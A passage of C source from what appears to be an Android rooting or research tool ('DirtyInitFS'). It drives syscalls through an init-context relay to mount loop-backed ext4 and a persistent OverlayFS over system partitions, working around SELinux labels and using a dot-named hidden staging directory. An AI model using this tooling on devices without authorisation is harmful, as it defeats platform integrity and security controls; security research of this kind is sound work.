        while (pos < dents + n) {
            uint16_t reclen = unpack_u32(pos + 16) & 0xFFFF;
            if (reclen == 0) break;
            char *dname = (char *)(pos + 19);

            if (strncmp(dname, "dm-", 3) == 0) {
                /* Read dm/name */
                char namepath[256];
                snprintf(namepath, sizeof(namepath), "/sys/block/%s/dm/name", dname);
                uint8_t *namedata = NULL;
                ssize_t nsz = relay_read_file(sock, namepath, &namedata, 4096);
                char dm_name[128] = "(unknown)";
                if (nsz > 0 && namedata) {
                    namedata[nsz] = '\0';
                    char *nl = strchr((char *)namedata, '\n');
                    if (nl) *nl = '\0';
                    strncpy(dm_name, (char *)namedata, sizeof(dm_name) - 1);
                }
                free(namedata);

                if (filter && strstr(dm_name, filter) == NULL && strstr(dname, filter) == NULL) {
                    pos += reclen;
                    continue;
                }

                /* Read dm/uuid */
                char uuidpath[256];
                snprintf(uuidpath, sizeof(uuidpath), "/sys/block/%s/dm/uuid", dname);
                uint8_t *uuiddata = NULL;
                ssize_t usz = relay_read_file(sock, uuidpath, &uuiddata, 4096);
                char dm_uuid[128] = "";
                if (usz > 0 && uuiddata) {
                    uuiddata[usz] = '\0';
                    char *nl = strchr((char *)uuiddata, '\n');
                    if (nl) *nl = '\0';
                    strncpy(dm_uuid, (char *)uuiddata, sizeof(dm_uuid) - 1);
                }
                free(uuiddata);

                /* Read size (sectors) */
                char sizepath[256];
                snprintf(sizepath, sizeof(sizepath), "/sys/block/%s/size", dname);
                uint8_t *sizedata = NULL;
                ssize_t ssz = relay_read_file(sock, sizepath, &sizedata, 256);
                uint64_t sectors = 0;
                if (ssz > 0 && sizedata) {
                    sizedata[ssz] = '\0';
                    sectors = (uint64_t)strtoull((char *)sizedata, NULL, 10);
                }
                free(sizedata);

                /* Read suspended state */
                char susppath[256];
                snprintf(susppath, sizeof(susppath), "/sys/block/%s/dm/suspended", dname);
                uint8_t *suspdata = NULL;
                ssize_t susz = relay_read_file(sock, susppath, &suspdata, 64);
                int suspended = 0;
                if (susz > 0 && suspdata) {
                    suspended = (suspdata[0] == '1');
                }
                free(suspdata);

                printf("%-12s %-30s %llu sectors (%llu MB)%s%s%s\n",
                       dname, dm_name,
                       (unsigned long long)sectors,
                       (unsigned long long)(sectors * 512 / (1024 * 1024)),
                       dm_uuid[0] ? "  uuid=" : "",
                       dm_uuid,
                       suspended ? "  [SUSPENDED]" : "");
                found++;
            }
            pos += reclen;
        }
    }
    relay_close(sock, dfd);

    if (!found) printf("No device-mapper devices found\n");
    return 0;
}

/* ── overlay: OverlayFS setup / status / teardown via init relay ────────── *
 *
 * Implements the full OverlayFS lifecycle from FINDING.md section 2:
 *   overlay setup [/system]   — mount persistent RW overlay on a partition
 *   overlay status            — list all overlay mounts with upper/lower/work
 *   overlay teardown [/system] — unmount an overlay
 *
 * The setup sequence (from FINDING.md section 2.1 "Minimal Viable Overlay"):
 *   1. Verify relay UID=0 (init context required for mount)
 *   2. Check if overlay already mounted on target
 *   3. Set fscreate context to overlayfs_file (FINDING.md section 9, item 7)
 *   4. Create /data/overlay/<part>/upper and /data/overlay/<part>/work dirs
 *   5. Restore fscreate context
 *   6. Parse /proc/1/mountinfo for shared mount propagation state
 *   7. Make target MS_PRIVATE (safe overlay mount — FINDING.md section 2.2)
 *   8. Mount the overlay with userxattr (kernel 5.15+ — FINDING.md section 5)
 *  8b. Relabel overlay root to overlayfs_file (fixes unlabeled:s0 from scratch ext4)
 *   9. Restore MS_SHARED if target was shared (FINDING.md section 9, item 8)
 *  10. Verify success via /proc/mounts
 *
 * All mount flag constants from <linux/mount.h> — immutable kernel ABI. */

/* overlay_set_fscreate — write SELinux fscreate context via /proc/self/attr.
 *
 * Uses relay_openat + relay_write because init's /proc/self/attr/fscreate
 * requires the PROCESS running as init to write it (FINDING.md section 8.4:
 * "allow init init : process { setfscreate }").
 *
 * Pass NULL or "" to context to clear fscreate back to default.
 * Returns 0 on success, -1 on failure (with message printed). */
static int overlay_set_fscreate(int sock, const char *context) {
    OVLOG("fscreate: opening /proc/self/attr/fscreate");
    int64_t fd = relay_openat(sock, "/proc/self/attr/fscreate", MY_O_WRONLY, 0);
    if (fd < 0) {
        OVERR("fscreate: open FAILED: %s (ret=%lld)", errno_str((int)(-fd)), (long long)fd);
        return -1;
    }
    OVLOG("fscreate: fd=%lld", (long long)fd);

    int64_t ret;
    if (context && context[0]) {
        OVLOG("fscreate: writing '%s' (%zu bytes)", context, strlen(context));
        ret = relay_write(sock, fd, context, strlen(context));
    } else {
        OVLOG("fscreate: clearing (writing NUL byte)");
        char nul = '\0';
        ret = relay_write(sock, fd, &nul, 1);
    }
    OVLOG("fscreate: write ret=%lld", (long long)ret);
    relay_close(sock, fd);

    if (ret < 0) {
        OVERR("fscreate: write FAILED: %s", errno_str((int)(-ret)));
        return -1;
    }
    return 0;
}

/* overlay_mkdir_p — create a directory via relay, tolerating EEXIST.
 *
 * Overlay dirs may exist from a previous setup attempt. EEXIST (errno 17)
 * is not an error in that case. Any other failure is fatal.
 * Returns 0 on success or EEXIST, -1 on real failure. */
static int overlay_mkdir_p(int sock, const char *path, int mode) {
    OVLOG("mkdir: %s (mode=%04o)", path, mode);
    int64_t ret = relay_mkdirat(sock, path, mode);
    if (ret < 0) {
        int err = (int)(-ret);
        if (err == 17) {
            OVLOG("mkdir: %s already exists (EEXIST, ok)", path);
            return 0;
        }
        OVERR("mkdir: %s FAILED: %s (ret=%lld)", path, errno_str(err), (long long)ret);
        return -1;
    }
    OVLOG("mkdir: %s created ok", path);
    return 0;
}

/* ── Scratch partition support ──────────────────────────────────────────────
 *
 * Samsung's /data has ext4 casefolding (CONFIG_UNICODE=y + s_encoding set).
 * This causes DCACHE_OP_HASH on every /data dentry, which ovl_dentry_weird()
 * (super.c:150-153) rejects with EINVAL. AOSP solves this with a "scratch
 * partition" — a loop-mounted ext4 image WITHOUT casefold on /data.
 *
 * Scratch lifecycle:
 *   1. Image file at /data/overlay_scratch.img (persists across reboots)
 *   2. Loop device bound via LOOP_SET_FD ioctl
 *   3. ext4 mounted at SCRATCH_MNT (/dev/.overlay)
 *   4. upper/work dirs created on the scratch mount
 *   5. Overlay mount uses scratch paths for upper/work
 *
 * The image is pre-formatted at build time with mke2fs WITHOUT -O casefold.
 * At runtime, it's copied from APK assets on first use, then expanded with
 * ftruncate + EXT4_IOC_RESIZE_FS to the desired size.
 *
 * Ioctl constants from include/uapi/linux/loop.h and fs/ext4/ext4.h:
 *   LOOP_CTL_GET_FREE = 0x4C82
 *   LOOP_SET_FD       = 0x4C00
 *   LOOP_CLR_FD       = 0x4C01
 *   LOOP_SET_CAPACITY  = 0x4C07
 *   EXT4_IOC_RESIZE_FS = 0x40086610 (_IOW('f', 16, __u64))
 */

/* Image lives on /data/media/0/ (= /sdcard/) because the kernel's kworker
 * threads need read access to the loop backing file. The kernel domain has
 * read permission on media_rw_data_file but NOT on system_data_root_file
 * (files at /data/ root). /data/media/0/ = media_rw_data_file. */
#define SCRATCH_IMG     "/data/media/0/overlay_scratch.img"
#define SCRATCH_MNT     "/dev/.overlay"
#define SCRATCH_SIZE_MB 256
#define LOOP_CTL_GET_FREE 0x4C82
#define LOOP_SET_FD       0x4C00
#define LOOP_CLR_FD       0x4C01
#define LOOP_SET_CAPACITY 0x4C07
#define EXT4_IOC_RESIZE_FS 0x40086610

/* overlay_scratch_is_mounted — check if the scratch filesystem is already
 * loop-mounted at SCRATCH_MNT. Returns 1 if mounted, 0 if not, -1 on error. */
static int overlay_scratch_is_mounted(int sock) {
    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/mounts", &data, 0);
    if (sz <= 0 || !data) { free(data); return -1; }
    data[sz] = '\0';

    int found = 0;
    char *line = (char *)data;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        /* Check if SCRATCH_MNT appears as mount point (field 2) */
        const char *f1_end = strchr(line, ' ');
        if (f1_end) {
            const char *mp = f1_end + 1;
            const char *mp_end = strchr(mp, ' ');
            if (mp_end) {
                size_t mp_len = (size_t)(mp_end - mp);
                if (mp_len == strlen(SCRATCH_MNT) &&
                    memcmp(mp, SCRATCH_MNT, mp_len) == 0) {
                    found = 1;
                    break;
                }
            }
        }
        if (!nl) break;
        line = nl + 1;
    }
    free(data);
    return found;
}

/* Forward declaration — defined after overlay_setup_scratch */
static void overlay_detach_orphan_loops(int sock);

/* overlay_setup_scratch — ensure the scratch ext4 image exists, is loop-mounted,
 * and is available at SCRATCH_MNT. This is the casefold workaround.
 *
 * Returns 0 on success (scratch mounted at SCRATCH_MNT), -1 on failure. */
static int overlay_setup_scratch(int sock) {
    const unsigned long MS_NOATIME_L = 0x400;

    /* ── Clean up orphaned loop devices from previous crash ── */
    overlay_detach_orphan_loops(sock);

    /* ── Already mounted? ── */
    int mounted = overlay_scratch_is_mounted(sock);
    if (mounted == 1) {
        OVLOG("scratch: already mounted at %s", SCRATCH_MNT);
        printf("overlay: scratch partition already mounted at %s\n", SCRATCH_MNT);
        return 0;
    }

    /* ── Ensure image file exists ──
     * SCRATCH_IMG = /data/media/0/overlay_scratch.img (= /sdcard/overlay_scratch.img).
     * The Java APK extracts the seed image to /sdcard/overlay_scratch.img via
     * doExtract(). Since /data/media/0/ IS /sdcard/, no copy is needed —
     * init reads the same physical file the Java wrote. */
    uint8_t statbuf[256];
    int64_t sr = relay_fstatat(sock, SCRATCH_IMG, statbuf, sizeof(statbuf));
    if (sr < 0) {
        OVERR("scratch: %s not found", SCRATCH_IMG);
        fprintf(stderr, "overlay: scratch image not found\n");
        fprintf(stderr, "  tap EXTRACT CLI in the DirtyInitFS app first\n");
        fprintf(stderr, "  (or: adb push overlay_scratch.img /sdcard/)\n");
        return -1;
    }
    OVLOG("scratch: image found at %s", SCRATCH_IMG);

    /* ── Expand image to target size ── */
    {
        int64_t fd = relay_openat(sock, SCRATCH_IMG, MY_O_RDWR, 0);
        if (fd < 0) {
            OVERR("scratch: cannot open %s for resize: %s",
                  SCRATCH_IMG, errno_str((int)(-fd)));
            return -1;
        }
        int64_t target_sz = (int64_t)SCRATCH_SIZE_MB * 1024 * 1024;
        int64_t tr = relay_ftruncate(sock, fd, target_sz);
        OVLOG("scratch: ftruncate to %lldMB ret=%lld",
              (long long)(SCRATCH_SIZE_MB), (long long)tr);
        if (tr < 0) {
            OVERR("scratch: ftruncate to %dMB failed: %s — /data may be full",
                  SCRATCH_SIZE_MB, errno_str((int)(-tr)));
            relay_close(sock, fd);
            relay_unlinkat(sock, SCRATCH_IMG, 0);
            return -1;
        }
        relay_close(sock, fd);
    }

    /* ── Validate ext4 superblock before mounting ──
     * ext4 magic 0xEF53 at superblock offset 56 (file offset 0x438 = 1080).
     * If the image is corrupt (stale from a previous failed copy), delete
     * and force re-extraction on next run rather than mount garbage → EIO. */
    {
        int64_t vfd = relay_openat(sock, SCRATCH_IMG, MY_O_RDONLY, 0);
        if (vfd >= 0) {
            /* Seek to superblock magic: offset 1024 (boot block) + 56 (s_magic) */
            int64_t sk = send_syscall(sock, 62/*SYS_lseek*/,
                                      (uint64_t)vfd, 1080, 0/*SEEK_SET*/, 0,0,0,
                                      0, NULL, 0, NULL, 0);
            uint8_t magic_buf[2] = {0, 0};
            if (sk == 1080) {
                relay_read(sock, vfd, magic_buf, 2);
            }
            relay_close(sock, vfd);
            uint16_t magic = (uint16_t)magic_buf[0] | ((uint16_t)magic_buf[1] << 8);
            OVLOG("scratch: ext4 magic = 0x%04x (expect 0xEF53)", magic);
            if (magic != 0xEF53) {
                OVERR("scratch: %s has invalid ext4 superblock (magic=0x%04x), deleting",
                      SCRATCH_IMG, magic);
                printf("overlay: scratch image is corrupt, deleting and retrying\n");
                relay_unlinkat(sock, SCRATCH_IMG, 0);
                return -1;
            }
        }
    }

    /* ── Allocate a free loop device ── */
    int64_t ctlfd = relay_openat(sock, "/dev/loop-control", MY_O_RDWR, 0);
    if (ctlfd < 0) {
        OVERR("scratch: cannot open /dev/loop-control: %s", errno_str((int)(-ctlfd)));
        return -1;
    }
    int64_t loop_nr = send_syscall(sock, SYS_ioctl,
                                   (uint64_t)ctlfd, LOOP_CTL_GET_FREE, 0,0,0,0,
                                   0, NULL, 0, NULL, 0);
    relay_close(sock, ctlfd);
    if (loop_nr < 0) {
        OVERR("scratch: LOOP_CTL_GET_FREE failed: %s", errno_str((int)(-loop_nr)));
        return -1;
    }
    OVLOG("scratch: free loop device = /dev/block/loop%lld", (long long)loop_nr);

    /* ── Open the loop device — create node with mknod if it doesn't exist.
     * LOOP_CTL_GET_FREE allocates a kernel device but does NOT create the
     * /dev/block/ node. Pre-created nodes cover loop0..47 (CONFIG_BLK_DEV_
     * LOOP_MIN_COUNT=48). Beyond that, we must mknod ourselves.
     * Loop devices: major=7, minor=N. */
    char loop_path[64];
    snprintf(loop_path, sizeof(loop_path), "/dev/block/loop%lld", (long long)loop_nr);
    int64_t loopfd = relay_openat(sock, loop_path, MY_O_RDWR, 0);
    if (loopfd < 0) {
        /* Device node doesn't exist — create it via mknod.
         * S_IFBLK=0060000, mode 0660, dev=makedev(7, loop_nr) */
        uint32_t dev = ((7 & 0xfff) << 8) | ((uint32_t)loop_nr & 0xff)
                     | (((uint32_t)loop_nr & 0xfff00) << 12);
        OVLOG("scratch: creating device node %s (major=7 minor=%lld dev=0x%x)",
              loop_path, (long long)loop_nr, dev);
        send_syscall(sock, SYS_mknodat,
                     (uint64_t)(int64_t)(-100)/*AT_FDCWD*/, 0, 0060000 | 0660,
                     (uint64_t)dev, 0, 0,
                     FLAG_X1_DATA,
                     (uint8_t *)loop_path, strlen(loop_path) + 1,
                     NULL, 0);
        loopfd = relay_openat(sock, loop_path, MY_O_RDWR, 0);
    }
    if (loopfd < 0) {
        OVERR("scratch: cannot open loop device %lld: %s",
              (long long)loop_nr, errno_str((int)(-loopfd)));
        return -1;
    }
    OVLOG("scratch: opened %s (fd=%lld)", loop_path, (long long)loopfd);
    int64_t imgfd = relay_openat(sock, SCRATCH_IMG, MY_O_RDWR, 0);
    if (imgfd < 0) {
        OVERR("scratch: cannot open %s: %s", SCRATCH_IMG, errno_str((int)(-imgfd)));
        relay_close(sock, loopfd);
        return -1;
    }

    /* ── Bind image to loop device: ioctl(loopfd, LOOP_SET_FD, imgfd) ── */
    int64_t lr = send_syscall(sock, SYS_ioctl,
                              (uint64_t)loopfd, LOOP_SET_FD, (uint64_t)imgfd,
                              0, 0, 0,
                              0, NULL, 0, NULL, 0);
    relay_close(sock, imgfd);
    OVLOG("scratch: LOOP_SET_FD(%s, %s) ret=%lld", loop_path, SCRATCH_IMG, (long long)lr);
    if (lr < 0) {
        OVERR("scratch: LOOP_SET_FD failed: %s", errno_str((int)(-lr)));
        relay_close(sock, loopfd);
        return -1;
    }

    /* LOOP_SET_CAPACITY removed: ftruncate happens BEFORE LOOP_SET_FD,
     * so the loop device already sees the correct size at bind time. */
    relay_close(sock, loopfd);

    /* ── Create mount point — use default tmpfs label, NOT overlayfs_file.
     * init has mounton permission for tmpfs dirs but NOT for overlayfs_file dirs.
     * (avc: denied { mounton } tcontext=overlayfs_file if mislabeled)
     * Remove any stale dir first (may have wrong label from a previous run).
     * Equivalent of rm -rf: remove contents then rmdir. */
    {
        int64_t rmr = relay_unlinkat(sock, SCRATCH_MNT, MY_AT_REMOVEDIR);
        if (rmr == -39) {
            /* ENOTEMPTY — clean out contents first */
            OVLOG("scratch: %s not empty, cleaning contents", SCRATCH_MNT);
            int64_t dfd = relay_openat(sock, SCRATCH_MNT, MY_O_RDONLY, 0);
            if (dfd >= 0) {
                uint8_t dents[4096];
                for (;;) {
                    int64_t nr = send_syscall(sock, SYS_getdents64,
                                             (uint64_t)dfd, 0, 4096, 0, 0, 0,
                                             FLAG_X1_DATA, dents, 4096, dents, 4096);
                    if (nr <= 0) break;
                    size_t pos = 0;
                    while (pos < (size_t)nr) {
                        struct { uint64_t ino; int64_t off; uint16_t reclen; uint8_t type; char name[1]; } *de;
                        de = (void *)(dents + pos);
                        if (de->name[0] != '.' ||
                            (de->name[1] != '\0' && (de->name[1] != '.' || de->name[2] != '\0'))) {
                            char child[256];
                            snprintf(child, sizeof(child), "%s/%s", SCRATCH_MNT, de->name);
                            if (de->type == 4) /* DT_DIR */
                                relay_unlinkat(sock, child, MY_AT_REMOVEDIR);
                            else
                                relay_unlinkat(sock, child, 0);
                        }
                        pos += de->reclen;
                    }
                }
                relay_close(sock, dfd);
            }
            relay_unlinkat(sock, SCRATCH_MNT, MY_AT_REMOVEDIR);
        }
    }
    overlay_mkdir_p(sock, SCRATCH_MNT, 0755);

    /* ── Mount ext4 on the loop device ── */
    OVLOG("scratch: mounting %s on %s as ext4", loop_path, SCRATCH_MNT);
    printf("overlay: mounting scratch partition at %s\n", SCRATCH_MNT);
    /* Mount WITHOUT context= option. The ext4 stays unlabeled:s0.
     * init has full permissions on unlabeled (dir/file/filesystem).
     * context=overlayfs_file is blocked by SELinux (overlayfs_file is not
     * in contextmount_type attribute, so relabelto is denied). */
    int64_t mr = relay_mount(sock, loop_path, SCRATCH_MNT, "ext4", MS_NOATIME_L, NULL);
    OVLOG("scratch: mount ret=%lld", (long long)mr);
    if (mr < 0) {
        OVERR("scratch: mount %s failed: %s", loop_path, errno_str((int)(-mr)));
        /* Unbind loop device on mount failure to prevent leak */
        int64_t clf = relay_openat(sock, loop_path, MY_O_RDWR, 0);
        if (clf >= 0) {
            send_syscall(sock, SYS_ioctl, (uint64_t)clf, LOOP_CLR_FD, 0,0,0,0,
                        0, NULL, 0, NULL, 0);
            relay_close(sock, clf);
        }
        return -1;
    }

    /* ── Resize the ext4 filesystem to fill the expanded image ── */
    {
        int64_t mntfd = relay_openat(sock, SCRATCH_MNT, MY_O_RDONLY, 0);
        if (mntfd >= 0) {
            uint64_t new_blocks = (uint64_t)SCRATCH_SIZE_MB * 1024 * 1024 / 4096;
            /* EXT4_IOC_RESIZE_FS takes a pointer to __u64 in x2.
             * We pack the value in the data buffer and use FLAG_X2_DATA. */
            uint8_t resize_buf[8];
            memcpy(resize_buf, &new_blocks, 8);
            int64_t rr = send_syscall(sock, SYS_ioctl,
                                      (uint64_t)mntfd, EXT4_IOC_RESIZE_FS, 0,
                                      0, 0, 0,
                                      FLAG_X2_DATA, resize_buf, sizeof(new_blocks),
                                      NULL, 0);
            OVLOG("scratch: EXT4_IOC_RESIZE_FS(%llu blocks) ret=%lld",
                  (unsigned long long)new_blocks, (long long)rr);
            if (rr < 0) {
                /* Non-fatal: filesystem works at seed size */
                printf("overlay: WARNING — resize to %dMB failed (%s), using seed size\n",
                       SCRATCH_SIZE_MB, errno_str((int)(-rr)));
            } else {
                printf("overlay: scratch partition resized to %dMB\n", SCRATCH_SIZE_MB);
            }
            relay_close(sock, mntfd);
        }
    }

    return 0;
}

/* overlay_detach_orphan_loops — scan /sys/block/loopN/loop/backing_file for
 * entries containing overlay_scratch.img and detach them via LOOP_CLR_FD.
 * Called at the start of overlay_setup_scratch to clean up orphaned loop
 * devices from a previous crash or unclean teardown. */
static void overlay_detach_orphan_loops(int sock) {
    /* Scan loop0..loop63 — S23 has 48 pre-created + dynamically allocated beyond */
    for (int i = 0; i < 64; i++) {
        char bf_path[128];
        snprintf(bf_path, sizeof(bf_path),
                 "/sys/block/loop%d/loop/backing_file", i);
        uint8_t *bf_data = NULL;
        ssize_t bf_sz = relay_read_file(sock, bf_path, &bf_data, 256);
        if (bf_sz <= 0 || !bf_data) {
            free(bf_data);
            continue;
        }
        bf_data[bf_sz] = '\0';
        /* Strip trailing newline */
        if (bf_sz > 0 && bf_data[bf_sz - 1] == '\n')
            bf_data[bf_sz - 1] = '\0';

        if (strstr((char *)bf_data, "overlay_scratch.img") != NULL) {
            OVLOG("orphan: loop%d backs '%s' — detaching", i, (char *)bf_data);
            char lp[64];
            snprintf(lp, sizeof(lp), "/dev/block/loop%d", i);
            int64_t lfd = relay_openat(sock, lp, MY_O_RDWR, 0);
            if (lfd < 0) {
                snprintf(lp, sizeof(lp), "/dev/loop%d", i);
                lfd = relay_openat(sock, lp, MY_O_RDWR, 0);
            }
            if (lfd >= 0) {
                int64_t cr = send_syscall(sock, SYS_ioctl,
                                          (uint64_t)lfd, LOOP_CLR_FD, 0,0,0,0,
                                          0, NULL, 0, NULL, 0);
                OVLOG("orphan: LOOP_CLR_FD(%s) ret=%lld", lp, (long long)cr);
                relay_close(sock, lfd);
            }
        }
        free(bf_data);
    }
}

/* overlay_teardown_scratch — unmount scratch ext4 and detach loop device.
 * Called from overlay_teardown after the overlay umount, if no other overlays
 * use the scratch mount. Returns 0 on success, -1 on error. */
static int overlay_teardown_scratch(int sock) {
    /* Only tear down if scratch is actually mounted */
    if (overlay_scratch_is_mounted(sock) != 1) return 0;

    /* Unmount scratch ext4 from SCRATCH_MNT */
    size_t mlen = strlen(SCRATCH_MNT) + 1;
    uint8_t umbuf[64];
    memset(umbuf, 0, sizeof(umbuf));
    memcpy(umbuf, SCRATCH_MNT, mlen);
    int64_t ur = send_syscall(sock, SYS_umount2, 0,0,0,0,0,0,
                              FLAG_X0_DATA, umbuf, mlen, NULL, 0);
    OVLOG("scratch: umount %s ret=%lld", SCRATCH_MNT, (long long)ur);
    if (ur < 0) {
        OVERR("scratch: umount %s failed: %s", SCRATCH_MNT, errno_str((int)(-ur)));
        return -1;
    }

    /* Detach any loop devices still backing overlay_scratch.img */
    overlay_detach_orphan_loops(sock);
    return 0;
}

/* overlay_check_mounted — check if an overlay is already mounted on target.
 *
 * Reads /proc/mounts and searches for an "overlay" filesystem line whose
 * second field (mount point) matches the target path exactly.
 * Returns: 1 = already mounted, 0 = not mounted, -1 = read error. */
static int overlay_check_mounted(int sock, const char *target) {
    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/mounts", &data, 0);
    if (sz <= 0 || !data) {
        free(data);
        return -1;
    }
    data[sz] = '\0';

    int found = 0;
    char *line = (char *)data;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';

        /* /proc/mounts format: source mountpoint type options dump pass
         * Check field 3 (type) for "overlay" — not field 1 (source), because
         * overlays mounted by fs_mgr, Magisk, or adb use different source names */
        {
            const char *f1 = line;
            const char *f2 = strchr(f1, ' ');
            if (f2) {
                f2++;
                const char *f3 = strchr(f2, ' ');
                if (f3) {
                    f3++;
                    const char *f3_end = strchr(f3, ' ');
                    size_t type_len = f3_end ? (size_t)(f3_end - f3) : strlen(f3);
                    if (type_len == 7 && memcmp(f3, "overlay", 7) == 0) {
                        size_t mp_len = (size_t)(f3 - 1 - f2);
                        size_t tgt_len = strlen(target);
                        if (mp_len == tgt_len && memcmp(f2, target, tgt_len) == 0) {
                            found = 1;
                            break;
                        }
                    }
                }
            }
        }

        if (!nl) break;
        line = nl + 1;
    }
    free(data);
    return found;
}

/* overlay_is_shared — check if a mount point has shared propagation.
 *
 * Parses /proc/1/mountinfo looking for the target mount point's line
 * and checks if it contains "shared:" tag (FINDING.md section 9 item 8:
 * "Init's root / is shared:1. ... mount(NULL, '/system', NULL,
 * MS_SHARED|MS_REC, NULL) restores shared propagation").
 *
 * Returns: 1 = shared, 0 = not shared (private/slave), -1 = error. */
static int overlay_is_shared(int sock, const char *target) {
    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/1/mountinfo", &data, 0);
    if (sz <= 0 || !data) {
        free(data);
        return -1;
    }
    data[sz] = '\0';

    int shared = 0;
    char *line = (char *)data;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';

        /* mountinfo format (fields are space-separated):
         * mount_id parent_id major:minor root MOUNT_POINT optional_fields - ...
         * We need field 5 (mount point, 0-indexed=4) and then scan for "shared:" */
        const char *p = line;
        int field = 0;
        const char *mount_point = NULL;
        size_t mp_len = 0;
        while (*p && field < 5) {
            /* Skip leading spaces */
            while (*p == ' ') p++;
            if (field == 4) {
                /* Field 5 = mount point */
                mount_point = p;
                const char *sp = strchr(p, ' ');
                mp_len = sp ? (size_t)(sp - p) : strlen(p);
            }
            /* Advance past this field */
            while (*p && *p != ' ') p++;
            field++;
        }

        /* Check if this line's mount point matches our target */
        size_t tgt_len = strlen(target);
        if (mount_point && mp_len == tgt_len &&
            memcmp(mount_point, target, tgt_len) == 0) {
            /* Check for "shared:" in the optional fields only — these start
             * after field 5 (mount_point) and end at the "-" separator.
             * Scanning the whole line would false-positive on paths containing "shared:" */
            const char *opt_start = mount_point + mp_len;
            const char *dash = strstr(opt_start, " - ");
            const char *opt_end = dash ? dash : opt_start + strlen(opt_start);
            size_t opt_span = (size_t)(opt_end - opt_start);
            char *opt_region = (char *)malloc(opt_span + 1);
            if (opt_region) {
                memcpy(opt_region, opt_start, opt_span);
                opt_region[opt_span] = '\0';
                if (strstr(opt_region, "shared:") != NULL)
                    shared = 1;
                free(opt_region);
            }
            break; /* Found our mount point, stop scanning */
        }

        if (!nl) break;
        line = nl + 1;
    }
    free(data);
    return shared;
}

/* Maximum number of submounts we track for any single partition.
 * 32 is generous — /vendor and /system rarely exceed ~15 bind mounts.
 * Using a fixed limit avoids heap allocation for the entry array,
 * which matters because this runs inside a relay-spawned init child
 * where malloc/free overhead and fragmentation must be minimized. */
#define MAX_SUBMOUNTS 32

/* Staging directory under tmpfs where submounts are temporarily MS_MOVE'd
 * during overlay setup.  tmpfs (/dev) is always writable from init context,
 * and the leading dot keeps it invisible to casual enumeration. */
#define OVL_STAGING_PATH "/dev/.ovl_staging"

/* One entry per discovered submount of a target partition.
 *
 * Life-cycle:
 *   1. overlay_parse_submounts fills mount_point + shared_flag
 *   2. evacuate phase fills temp_dir + sets moved=1
 *   3. after overlay mount, restore phase MS_MOVE's back from temp_dir
 *   4. if shared_flag was set, restore phase re-applies MS_SHARED */
struct submount_entry {
    char mount_point[256];  /* absolute path, e.g. "/vendor/firmware" */
    char temp_dir[256];     /* filled by evacuate — staging path where mount was moved */
    int  shared_flag;       /* 1 if mount had "shared:N" tag before evacuation */
    int  moved;             /* 1 if successfully MS_MOVE'd to staging */
};

/* overlay_parse_submounts — discover all direct submounts of a target partition.
 *
 * Reads /proc/1/mountinfo (init's mount namespace, which is the root namespace
 * we care about for overlay setup) and collects every mount whose mount_point
 * is a DIRECT child of `target` — i.e., starts with target+"/".
 *
 * MOUNTINFO FORMAT (proc(5)):
 *   mount_id parent_id major:minor root mount_point mount_options [optional_tags ...] - fs_type source super_options
 *
 *   Fields 1-6 are fixed, followed by zero or more optional tags (each is a
 *   single word like "shared:42" or "master:7"), terminated by the literal "-"
 *   separator.  After "-" come fs_type, source, and super_options.
 *
 * DEDUPLICATION RATIONALE:
 *   The kernel lists mounts in chronological order.  When a path is over-mounted
 *   (e.g., /vendor/firmware has two stacked mounts), both lines appear.
 *   Only the LAST entry (the topmost, visible mount) matters for MS_MOVE.
 *   We keep only the last occurrence of each mount_point.
 *
 * FILTERING RATIONALE:
 *   If we have both /vendor/firmware AND /vendor/firmware/nfc, moving
 *   /vendor/firmware will drag /vendor/firmware/nfc along (it's a subtree).
 *   So we skip any entry whose mount_point is already "covered" by a
 *   previously-collected entry — specifically, if any collected entry's
 *   mount_point is a prefix of this entry's mount_point + "/".
 *
 * Returns: count of entries written to `out` (0 = no submounts found),
 *          or -1 on error (file read failure). */
static int overlay_parse_submounts(int sock, const char *target,
                                   struct submount_entry *out, int max_entries) {
    uint8_t *data = NULL;
    ssize_t sz = relay_read_file(sock, "/proc/1/mountinfo", &data, 0);
    if (sz <= 0 || !data) {
        OVERR("submounts: cannot read /proc/1/mountinfo");
        free(data);
        return -1;
    }
    /* relay_read_file returns a malloc'd buffer of exactly sz bytes;
     * null-terminate so we can treat it as a C string for parsing. */
    data[sz] = '\0';

    size_t tgt_len = strlen(target);

    /* PASS 1: Collect all lines whose mount_point starts with target+"/".
     * We use a temporary array the same size as out — this is stack-allocated
     * by the caller, so no heap pressure here.  We fill it in mountinfo order
     * (chronological), which means duplicates will have the LAST entry at
     * the highest index. */
    int raw_count = 0;

    char *line = (char *)data;
    while (*line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';

        /* Parse fields using the same pointer-walk pattern as overlay_is_shared.
         *
         * mountinfo fields (space-separated):
         *   0: mount_id    — integer, unique mount identifier
         *   1: parent_id   — integer, mount id of parent
         *   2: major:minor — device number pair
         *   3: root        — filesystem root (subtree) for this mount
         *   4: mount_point — where this mount is visible in the namespace
         *   5: mount_options — per-mount options (ro, noatime, etc.)
         *   6+: optional tags (shared:N, master:N, etc.) until "-" separator
         */
        const char *p = line;
        int field = 0;
        const char *mount_point = NULL;
        size_t mp_len = 0;

        while (*p && field < 5) {
            /* Skip leading whitespace between fields */
            while (*p == ' ') p++;
            if (field == 4) {
                /* Field index 4 = mount_point (the 5th field) */
                mount_point = p;
                const char *sp = strchr(p, ' ');
                mp_len = sp ? (size_t)(sp - p) : strlen(p);
            }
            /* Advance past the current field's content */
            while (*p && *p != ' ') p++;
            field++;
        }

        /* Check if this mount_point is a DIRECT submount of target.
         * A submount's path must:
         *   - be longer than target (so it's not target itself)
         *   - start with target exactly
         *   - have a '/' immediately after the target prefix
         *     (prevents "/vendorX" matching target "/vendor") */
        if (mount_point && mp_len > tgt_len &&
            memcmp(mount_point, target, tgt_len) == 0 &&
            mount_point[tgt_len] == '/') {

            /* Scan optional tags for "shared:" to record propagation state.
             *
             * The optional tags start right after field 5 (mount_options)
             * and end at the " - " separator.  We search within this region
             * only — scanning the whole line could false-positive on paths
             * that literally contain "shared:" (unlikely but defensive). */
            int shared = 0;
            const char *opt_start = mount_point + mp_len;
            const char *dash = strstr(opt_start, " - ");
            const char *opt_end = dash ? dash : opt_start + strlen(opt_start);
            size_t opt_span = (size_t)(opt_end - opt_start);

